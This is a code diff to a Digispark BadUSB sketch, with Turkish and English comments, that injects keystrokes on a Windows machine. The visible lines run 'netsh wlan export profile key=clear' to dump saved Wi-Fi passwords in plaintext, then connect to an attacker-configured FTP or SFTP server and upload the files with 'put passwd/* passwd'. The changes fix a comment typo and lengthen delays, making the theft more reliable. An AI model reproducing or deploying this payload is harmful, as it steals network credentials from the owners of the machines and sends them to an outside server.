@@ -3,7 +3,7 @@
 #define kbd_tr_tr   //Türkçe klavye kullanmıyorsanız silebilirsiniz. | //You can delete it if you are not using a Turkish keyboard.
 #include "DigiKeyboard.h"
 
-// FTP sunucunuzun bilgilerini tırnak içindeki yerlere giriniz. !! Tırnak işaretlreini silmeyiniz.
+// FTP sunucunuzun bilgilerini tırnak içindeki yerlere giriniz. !! Tırnak işaretlerini silmeyiniz.
 // Enter the details of your FTP server in quotation marks. !!! Do not delete the quotation marks.
 
 String conn_type = "ftp";              // sftp ya da ftp olduğunu belirtin
@@ -40,7 +40,7 @@ void loop() {
   DigiKeyboard.print("netsh wlan export profile key=clear");
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(600);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.print("cd ..");
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -52,13 +52,13 @@ void loop() {
   DigiKeyboard.print(ip);
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.print(password);
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.print("yes");
-  DigiKeyboard.delay(600);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.print("put passwd/* passwd");
